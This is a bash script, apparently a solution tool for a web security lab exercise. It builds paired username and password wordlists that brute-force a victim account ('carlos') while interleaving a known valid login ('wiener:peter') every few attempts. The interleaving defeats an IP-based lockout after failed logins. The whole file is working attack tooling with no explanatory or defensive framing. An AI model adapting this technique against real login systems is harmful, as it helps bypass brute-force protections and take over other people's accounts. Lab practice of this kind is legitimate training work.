#!/bin/bash

# Author: kond3
# Date: 15/07/2024
# Last modified: 15/07/2024 01:23:59

# Description
# Custom script to create two (user & pwd) payloads to bypass an IP blocking mechanism.
# NOTE:

# Usage
# ./ip_block.sh


if [ -f ./kond3_user.txt ];then
	rm ./kond3_user.txt
fi

if [ -f ./kond3_pwd.txt ];then
	rm ./kond3_pwd.txt
fi


echo ""

c=0						# Just a counter
n=3						# Number of tries allowed
known_user="wiener"		# User I know the pwd
p="peter"				# Pwd I know
valid_user="test"		# User I know only username
fp="kond3_pwd.txt"
fu="kond3_user.txt"
w="pwd.txt"				# wordlist to use for create the pwd wordlist with known_user's pwd added
u="username.txt"		# wordlist to use for create the user wordlist with known_user added, matching pwd wordlist lines

while read -r line <&7;do
	if [ $(($c % $n)) -eq 0 ];then
		echo "$p" >> ./"$fp"
	fi
	echo "$line" >> ./"$fp"
	c=$(($c + 1))
done 7< "$w"

l=$(wc -l ./"$fp" | awk '{print $1}')		# Lines for the wordlist file
t=$(($l / 2))								# Counter for creating the user file
c=0

while read -r line <&8;do
	if [[ "$line" == "peter" ]];then
		echo "wiener" >> ./"$fu"
	else
		echo "carlos" >> ./"$fu"
	fi
done 8< "$fp"

tail -n +2 "$fp" > "$fp".tmp && mv "$fp".tmp "$fp"
tail -n +2 "$fu" > "$fu".tmp && mv "$fu".tmp "$fu"

echo -n "Files created successfully."

echo ""
exit 0

